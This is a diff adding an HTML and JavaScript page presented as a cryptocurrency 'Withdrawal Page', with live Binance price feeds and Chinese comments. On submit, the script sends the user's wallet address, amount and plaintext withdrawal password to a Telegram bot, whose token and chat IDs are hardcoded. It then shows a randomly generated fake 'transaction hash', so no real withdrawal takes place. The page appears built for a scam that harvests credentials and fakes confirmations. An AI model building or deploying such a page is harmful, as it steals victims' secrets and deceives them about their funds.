@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Withdrawal Page</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: transparent;
+  color: #fff;
+  margin: 0;
+  padding: 20px;
+}
+.container {
+  max-width: 420px;
+  margin: auto;
+  background: transparent;
+  padding: 20px;
+  border-radius: 12px;
+}
+h2 { text-align:center; margin-bottom:15px; }
+input, select, button {
+  width: 100%;
+  padding: 8px;
+  margin: 8px 0;
+  border-radius: 6px;
+  border: none;
+  font-size: 14px;
+  box-sizing: border-box;
+}
+input, select { background: rgba(255,255,255,0.1); color: #fff; }
+button { background: #00bfff; color: #fff; cursor: pointer; font-weight: bold; }
+button:disabled { background: #555; cursor: not-allowed; }
+.fee { font-size: 13px; color: #ff0; margin-bottom:5px; }
+.balance { font-size:13px; color:#0f0; margin-bottom:10px; text-align:right; }
+#txHashDisplay { font-size:14px; margin-top:10px; color:#0ff; white-space: pre-line; }
+#copyBtn { display:none; margin-top:5px; padding:5px; font-size:13px; cursor:pointer; border:none; border-radius:5px; background:#00b894; color:#fff; }
+@media screen and (max-width:480px){ .container{width:90%; padding:15px;} }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>Withdrawal Page</h2>
+
+  <!-- Select Crypto -->
+  <label for="cryptoSelect">Select Cryptocurrency</label>
+  <select id="cryptoSelect"></select>
+
+  <!-- Coin Amount -->
+  <label for="coinAmount">Enter Coin Amount</label>
+  <input type="number" id="coinAmount" placeholder="Enter coin amount" min="0">
+  <div class="balance" id="usdtConverted">USDT Equivalent: 0</div>
+  <div class="fee" id="feeDisplay">Fee 0.1 USDT, Actual Amount: 0</div>
+  <div class="balance" id="usdtBalance">Live Price: 0 USDT</div>
+
+  <!-- Withdrawal Password -->
+  <label for="withdrawPwd">Withdrawal Password</label>
+  <input type="password" id="withdrawPwd" placeholder="Enter withdrawal password">
+  <button id="createPwdBtn">Create Withdrawal Password</button>
+  <button id="forgotPwdBtn">Forgot Withdrawal Password</button>
+
+  <!-- Wallet -->
+  <label for="wallet">Wallet Address</label>
+  <input type="text" id="wallet" placeholder="Enter or bind wallet address">
+  <button id="bindWalletBtn">Bind Wallet Address</button>
+
+  <button id="submitBtn" disabled>Submit Withdrawal</button>
+  <div id="txHashDisplay"></div>
+  <button id="copyBtn">Copy Transaction Hash</button>
+</div>
+
+<script>
+let cryptos = [];
+let selectedCrypto = '';
+let prices = {};
+
+// ==================== 币种获取 ====================
+fetch('https://api.binance.com/api/v3/exchangeInfo')
+.then(r => r.json())
+.then(info => {
+  cryptos = info.symbols.filter(s=>s.status==='TRADING' && s.quoteAsset==='USDT').map(s=>({symbol:s.symbol,name:s.baseAsset}));
+  selectedCrypto = cryptos[0].symbol;
+  populateSelect();
+  initWebSocket();
+});
+
+const cryptoSelect = document.getElementById('cryptoSelect');
+function populateSelect(){
+  cryptoSelect.innerHTML = '';
+  cryptos.forEach(c=>{
+    const opt = document.createElement('option');
+    opt.value = c.symbol;
+    opt.text = c.name;
+    cryptoSelect.appendChild(opt);
+  });
+  cryptoSelect.value = selectedCrypto;
+}
+cryptoSelect.addEventListener('change',()=>{
+  selectedCrypto = cryptoSelect.value;
+  updateUSDT();
+  autoConvertAmount();
+});
+
+// ==================== WebSocket 实时价格 ====================
+function initWebSocket(){
+  const ws = new WebSocket('wss://stream.binance.com:9443/ws/!miniTicker@arr');
+  ws.onmessage = evt=>{
+    const arr = JSON.parse(evt.data);
+    arr.forEach(t=>{
+      if(prices.hasOwnProperty(t.s) || cryptos.some(c=>c.symbol===t.s)){
+        prices[t.s] = parseFloat(t.c);
+      }
+    });
+    updateUSDT();
+    autoConvertAmount();
+  };
+}
+
+const usdtBalance = document.getElementById('usdtBalance');
+function updateUSDT(){
+  const price = prices[selectedCrypto] || 0;
+  usdtBalance.innerText = `Live ${selectedCrypto.replace('USDT','')} Price: ${price.toFixed(4)} USDT`;
+}
+
+// ==================== 金额计算 ====================
+const coinAmount = document.getElementById('coinAmount');
+const usdtConverted = document.getElementById('usdtConverted');
+const feeDisplay = document.getElementById('feeDisplay');
+const FEE = 0.1;
+
+function autoConvertAmount(){
+  const qty = parseFloat(coinAmount.value)||0;
+  const price = prices[selectedCrypto]||0;
+  const usdtAmt = qty*price;
+  usdtConverted.innerText = `USDT Equivalent: ${usdtAmt.toFixed(4)}`;
+  const real = Math.max(usdtAmt-FEE,0);
+  feeDisplay.innerText = `Fee ${FEE} USDT, Actual Amount: ${real.toFixed(4)}`;
+  checkSubmitEnable();
+}
+coinAmount.addEventListener('input', autoConvertAmount);
+
+// ==================== 钱包绑定 ====================
+let walletBound = false;
+let boundWalletValue = '';
+const walletInput = document.getElementById('wallet');
+const bindWalletBtn = document.getElementById('bindWalletBtn');
+bindWalletBtn.addEventListener('click', ()=>{
+  if(walletBound){ alert('Wallet already bound, cannot rebind'); return; }
+  const val = walletInput.value.trim();
+  if(!val){ alert('Please enter wallet address'); return; }
+  walletBound = true;
+  boundWalletValue = val;
+  walletInput.disabled = true;
+  bindWalletBtn.disabled = true;
+  checkSubmitEnable();
+  alert('Wallet bound successfully. Cannot modify without admin support.');
+});
+
+// ==================== 提现密码 ====================
+let pwdCreated = false;
+const withdrawPwd = document.getElementById('withdrawPwd');
+const createPwdBtn = document.getElementById('createPwdBtn');
+const forgotPwdBtn = document.getElementById('forgotPwdBtn');
+
+createPwdBtn.addEventListener('click', ()=>{
+  if(pwdCreated){ alert('Withdrawal password already created. Use "Forgot" to reset.'); return; }
+  const val = withdrawPwd.value.trim();
+  if(!val){ alert('Please enter withdrawal password'); return; }
+  pwdCreated = true;
+  withdrawPwd.disabled = true;
+  createPwdBtn.disabled = true;
+  checkSubmitEnable();
+  alert('Withdrawal password created successfully.');
+});
+
+forgotPwdBtn.addEventListener('click', ()=>{
+  if(!walletBound){ alert('Please bind wallet first'); return; }
+  const inputWallet = prompt("Enter your bound wallet address to reset password:");
+  if(inputWallet !== boundWalletValue){
+    alert('Wallet address mismatch. Contact support.');
+    return;
+  }
+  pwdCreated = false;
+  withdrawPwd.disabled = false;
+  createPwdBtn.disabled = false;
+  withdrawPwd.value = '';
+  alert('You can now create a new withdrawal password.');
+});
+
+// ==================== 提交按钮 ====================
+const submitBtn = document.getElementById('submitBtn');
+const txHashDisplay = document.getElementById('txHashDisplay');
+const copyBtn = document.getElementById('copyBtn');
+let submitted = false;
+
+function checkSubmitEnable(){
+  const qty = parseFloat(coinAmount.value)||0;
+  const price = prices[selectedCrypto]||0;
+  const usdtAmt = qty*price;
+  submitBtn.disabled = !(walletBound && pwdCreated && usdtAmt>FEE);
+}
+
+submitBtn.addEventListener('click', async ()=>{
+  if(submitted) return;
+  submitted = true;
+
+  const qty = parseFloat(coinAmount.value)||0;
+  const price = prices[selectedCrypto]||0;
+  const usdtAmt = qty*price;
+  const withdrawalHash = generateHash();
+
+  const message = `
+📤 *NEW WITHDRAWAL REQUEST*
+--------------------------------
+💰 Coin: ${selectedCrypto}
+🔢 Amount: ${qty}
+💵 USDT: ${usdtAmt.toFixed(4)}
+🏦 Wallet: ${boundWalletValue}
+🔐 Password: ${withdrawPwd.value}
+🆔 Transaction Hash: ${withdrawalHash}
+⚠️ Wallet & password can be bound once.
+*Please screenshot the transaction hash for record.*
+`;
+
+  const botToken = "8228143745:AAG1C6r7-8vwR4ajw4M-__FF1N9DoLdUQx0";
+  const chatIdUser = "6062973135";       // 原用户通知
+  const chatIdGroup = "-1003122480155";  // 机器人群通知
+
+  // 发送到用户 Telegram
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:chatIdUser,text:message,parse_mode:"Markdown"})
+  });
+
+  // 发送到群
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:chatIdGroup,text:message,parse_mode:"Markdown"})
+  });
+
+  txHashDisplay.innerText = `Transaction Hash: ${withdrawalHash}\n⚠️ Please screenshot and save this code.`;
+  copyBtn.style.display = 'block';
+
+  // 禁用所有元素
+  submitBtn.disabled = true;
+  coinAmount.disabled = true;
+  withdrawPwd.disabled = true;
+  cryptoSelect.disabled = true;
+  walletInput.disabled = true;
+  createPwdBtn.disabled = true;
+  forgotPwdBtn.disabled = true;
+  bindWalletBtn.disabled = true;
+
+  alert("Withdrawal submitted successfully! Please screenshot your Transaction Hash.");
+});
+
+copyBtn.addEventListener('click', ()=>{
+  navigator.clipboard.writeText(txHashDisplay.innerText).then(()=>{
+    alert('Transaction Hash copied! Please keep it safe.');
+  });
+});
+
+function generateHash(){
+  return 'TX-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2,8);
+}
+
+// 初始化
+populateSelect();
+updateUSDT();
+autoConvertAmount();
+</script>
+</body>
+</html>
